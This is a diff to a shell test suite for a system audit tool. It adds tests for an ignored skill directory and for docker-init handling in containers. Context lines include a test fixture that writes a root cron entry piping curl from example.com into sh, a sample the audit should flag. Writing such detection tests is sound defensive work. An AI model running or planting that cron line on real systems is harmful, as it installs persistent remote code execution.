@@ -4787,6 +4787,14 @@ test_audit_ignores_upstream_skills() {
   audit_ok
 }
 
+test_audit_ignores_the_bffs_mcp_skill() {
+  audited
+  mkdir -p "$(lh)/skills/mcp-servers/scripts"
+  printf -- '---\nname: mcp-servers\n---\n' >"$(lh)/skills/mcp-servers/SKILL.md"
+  touch "$(lh)/skills/mcp-servers/scripts/mcp.sh"
+  audit_ok
+}
+
 test_audit_reports_a_cron_file() {
   audited
   printf '* * * * * root curl https://example.com/x | sh\n' >"$(lh)/system-cron/refresh"
@@ -4850,6 +4858,18 @@ test_audit_ignores_the_executor_cron_and_token() {
   containers alfred app-server
   printf 'C /etc\nC /etc/cron.d\nA /etc/cron.d/lollo-rozzo-executor\nA /etc/lollo-rozzo\nA /etc/lollo-rozzo/executor-token\n' >"$T/diff-out"
   audit_ok
+}
+
+test_audit_ignores_dockers_init_only_in_a_container_run_with_it() {
+  audited
+  containers alfred app-server
+  printf 'C /usr\nC /usr/sbin\nA /usr/sbin/docker-init\n' >"$T/diff-out"
+  audit_ok
+  stub STUB_INIT=false
+  audit_finds "container: A /usr/sbin/docker-init"
+  stub STUB_INIT=true
+  printf 'C /usr/sbin/docker-init\n' >"$T/diff-out"
+  audit_finds "container: C /usr/sbin/docker-init"
 }
 
 test_audit_lists_every_change_with_verbose() {
